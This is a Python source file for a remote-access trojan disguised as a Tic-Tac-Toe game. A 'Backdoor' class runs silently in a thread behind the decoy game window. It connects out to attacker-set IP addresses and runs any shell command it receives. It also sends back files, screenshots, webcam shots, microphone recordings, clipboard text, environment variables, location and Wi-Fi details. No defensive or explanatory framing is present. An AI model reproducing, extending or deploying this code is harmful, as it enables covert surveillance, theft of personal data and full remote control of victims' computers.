import socket
import json
import os
import subprocess
import platform
import threading
import time
import tkinter as tk
from tkinter import messagebox
import mss  
import cv2  #opencv-python
import random
import sys
import sounddevice as sd  
import numpy as np
import requests
import pyperclip  

SERVER_IPS = ['private_ip_here', 'YOUR_PUBLIC_IP_HERE']  # e.g., ['192.168.1.50', '203.0.153.9']
SERVER_PORT = 555

class Backdoor:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connected = False
        self.current_dir = os.getcwd()
        threading.Thread(target=self.connect_to_server, daemon=True).start()

    def connect_to_server(self):
        while not self.connected:
            for ip in SERVER_IPS:
                try:
                    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.sock.connect((ip, SERVER_PORT))
                    self.connected = True
                    self.start_listening()
                    break
                except Exception:
                    time.sleep(random.randint(5, 15))
            if not self.connected:
                time.sleep(10)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.sock.send(json_data.encode())

    def reliable_recv(self):
        data = ''
        while True:
            try:
                data += self.sock.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue

    def execute_command(self, command):
        try:
            if command.lower().startswith('cd '):
                new_dir = command[3:].strip()
                if os.path.isabs(new_dir):
                    os.chdir(new_dir)
                else:
                    os.chdir(os.path.join(self.current_dir, new_dir))
                self.current_dir = os.getcwd()
                return f"Changed directory to {self.current_dir}"
            else:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, cwd=self.current_dir).decode()
                return result
        except subprocess.CalledProcessError as e:
            return f"Error: {e.output.decode()}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def get_sysinfo(self):
        info = {
            "OS": platform.system(),
            "Version": platform.version(),
            "Machine": platform.machine(),
            "Hostname": socket.gethostname(),
            "IP": socket.gethostbyname(socket.gethostname())
        }
        return str(info)

    def download_file(self, filename):
        try:
            with open(os.path.join(self.current_dir, filename), 'rb') as f:
                return f.read().hex()
        except FileNotFoundError:
            return f"ERROR: File {filename} not found"

    def upload_file(self, filename, file_data):
        try:
            with open(os.path.join(self.current_dir, filename), 'wb') as f:
                f.write(bytes.fromhex(file_data))
            return f"File {filename} uploaded to {self.current_dir}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def take_screenshot(self):
        try:
            with mss.mss() as sct:
                screenshot = sct.shot(output="temp.png")
                with open("temp.png", 'rb') as f:
                    data = f.read().hex()
                os.remove("temp.png")
                return data
        except Exception as e:
            return f"ERROR: {str(e)}"

    def webcam_snap(self):
        try:
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            if ret:
                cv2.imwrite("webcam.png", frame)
                with open("webcam.png", 'rb') as f:
                    data = f.read().hex()
                os.remove("webcam.png")
                cam.release()
                return data
            return "ERROR: No webcam"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def record_audio(self, duration=30):
        try:
            fs = 44100  # Sample rate
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
            sd.wait()
            # Use sounddevice's WAV writer for proper header
            sd.write("temp.wav", recording, fs)
            with open("temp.wav", 'rb') as f:
                data = f.read().hex()
            os.remove("temp.wav")
            return data
        except Exception as e:
            return f"ERROR: {str(e)}"

    def get_location(self):
        try:
            response = requests.get('http://ipinfo.io/json', timeout=5)
            data = response.json()
            return f"IP: {data.get('ip', 'Unknown')}, Location: {data.get('city', 'Unknown')}, {data.get('region', 'Unknown')}, {data.get('country', 'Unknown')}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def get_clipboard(self):
        try:
            return pyperclip.paste()
        except Exception as e:
            return f"ERROR: {str(e)}"

    def list_processes(self):
        try:
            result = subprocess.check_output('tasklist', shell=True, stderr=subprocess.STDOUT).decode()
            return result
        except Exception as e:
            return f"ERROR: {str(e)}"

    def get_env_vars(self):
        try:
            env_vars = {key: value for key, value in os.environ.items()}
            return str(env_vars)
        except Exception as e:
            return f"ERROR: {str(e)}"

    def get_wifi_ssid(self):
        try:
            result = subprocess.check_output('netsh wlan show interfaces', shell=True, stderr=subprocess.STDOUT).decode()
            for line in result.splitlines():
                if "SSID" in line and "BSSID" not in line:
                    return line.strip()
            return "No Wi-Fi SSID found"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def start_listening(self):
        while self.connected:
            try:
                command = self.reliable_recv()
                if command == 'quit':
                    self.sock.close()
                    self.connected = False
                elif command == 'sysinfo':
                    result = self.get_sysinfo()
                    self.reliable_send(result)
                elif command.startswith('download '):
                    filename = command.split(' ', 1)[1]
                    result = self.download_file(filename)
                    self.reliable_send(result)
                elif command.startswith('upload '):
                    parts = command.split(' ', 2)
                    filename, file_data = parts[1], parts[2]
                    result = self.upload_file(filename, file_data)
                    self.reliable_send(result)
                elif command == 'screenshot':
                    result = self.take_screenshot()
                    self.reliable_send(result)
                elif command == 'webcam':
                    result = self.webcam_snap()
                    self.reliable_send(result)
                elif command.startswith('audio'):
                    parts = command.split()
                    duration = int(parts[1]) if len(parts) > 1 else 30
                    result = self.record_audio(duration)
                    self.reliable_send(result)
                elif command == 'location':
                    result = self.get_location()
                    self.reliable_send(result)
                elif command == 'clipboard':
                    result = self.get_clipboard()
                    self.reliable_send(result)
                elif command == 'ps':
                    result = self.list_processes()
                    self.reliable_send(result)
                elif command == 'env':
                    result = self.get_env_vars()
                    self.reliable_send(result)
                elif command == 'wifi':
                    result = self.get_wifi_ssid()
                    self.reliable_send(result)
                else:
                    result = self.execute_command(command)
                    self.reliable_send(result)
            except Exception as e:
                self.reliable_send(f"ERROR: {str(e)}")
                self.sock.close()
                self.connected = False
                self.connect_to_server()

class TicTacToe:
    def __init__(self, root):
        self.root = root
        self.root.title("Tic-Tac-Toe")
        self.root.geometry("500x600")  # Bigger screen
        self.root.resizable(False, False)
        self.root.configure(bg="#2c3e50")

        self.current_player = "X"
        self.board = [""] * 9
        self.buttons = []

        tk.Label(self.root, text="Tic-Tac-Toe", font=("Arial", 20, "bold"), bg="#2c3e50", fg="white").pack(pady=10)
        
        frame = tk.Frame(self.root, bg="#2c3e50")
        frame.pack(pady=10)
        for i in range(3):
            for j in range(3):
                btn = tk.Button(frame, text="", font=("Arial", 20, "bold"), width=5, height=2,
                                bg="#ecf0f1", fg="#e74c3c" if self.current_player == "X" else "#3498db",
                                command=lambda row=i, col=j: self.button_click(row, col), relief="flat")
                btn.grid(row=i, column=j, padx=5, pady=5)
                self.buttons.append(btn)

        self.turn_label = tk.Label(self.root, text="Player X's Turn", font=("Arial", 14), bg="#2c3e50", fg="white")
        self.turn_label.pack(pady=5)
        self.status_label = tk.Label(self.root, text="", font=("Arial", 16, "bold"), bg="#2c3e50", fg="#f1c40f")
        self.status_label.pack(pady=5)

        tk.Button(self.root, text="Restart", command=self.restart, font=("Arial", 12, "bold"), bg="#e67e22", fg="white", relief="flat", padx=10, pady=5).pack(pady=10)

    def button_click(self, row, col):
        index = row * 3 + col
        if self.board[index] == "" and not self.check_winner():
            self.board[index] = self.current_player
            self.buttons[index].config(text=self.current_player, state="disabled", fg="#e74c3c" if self.current_player == "X" else "#3498db")
            if self.check_winner():
                self.status_label.config(text=f"Player {self.current_player} Wins!", fg="#2ecc71")
                self.disable_buttons()
            elif "" not in self.board:
                self.status_label.config(text="It's a Tie!", fg="#e67e22")
                self.disable_buttons()
            else:
                self.current_player = "O" if self.current_player == "X" else "X"
                self.turn_label.config(text=f"Player {self.current_player}'s Turn")

    def check_winner(self):
        wins = [(0, 1, 2), (3, 4, 5), (6, 7, 8), (0, 3, 6), (1, 4, 7), (2, 5, 8), (0, 4, 8), (2, 4, 6)]
        for a, b, c in wins:
            if self.board[a] == self.board[b] == self.board[c] != "":
                return True
        return False

    def disable_buttons(self):
        for btn in self.buttons:
            btn.config(state="disabled")

    def restart(self):
        self.current_player = "X"
        self.board = [""] * 9
        self.status_label.config(text="")
        self.turn_label.config(text="Player X's Turn")
        for btn in self.buttons:
            btn.config(text="", state="normal")

def fake_prompt():
    root = tk.Tk()
    root.title("Game Time")
    root.geometry("350x250")
    root.resizable(False, False)
    root.configure(bg="#34495e")

    tk.Label(root, text="Ready to Play?", font=("Arial", 20, "bold"), bg="#34495e", fg="white").pack(pady=20)
    tk.Label(root, text="Enjoy a quick game of Tic-Tac-Toe!", font=("Arial", 12), bg="#34495e", fg="#bdc3c7").pack(pady=10)

    def play_game():
        root.destroy()
        game_root = tk.Tk()
        TicTacToe(game_root)
        game_root.mainloop()

    tk.Button(root, text="Start Game", command=play_game, font=("Arial", 12, "bold"), bg="#1abc9c", fg="white", relief="flat", padx=15, pady=8).pack(pady=20)
    root.mainloop()

if __name__ == "__main__":
    backdoor = Backdoor()
    threading.Thread(target=fake_prompt, daemon=True).start()
    while True:
        time.sleep(1000)
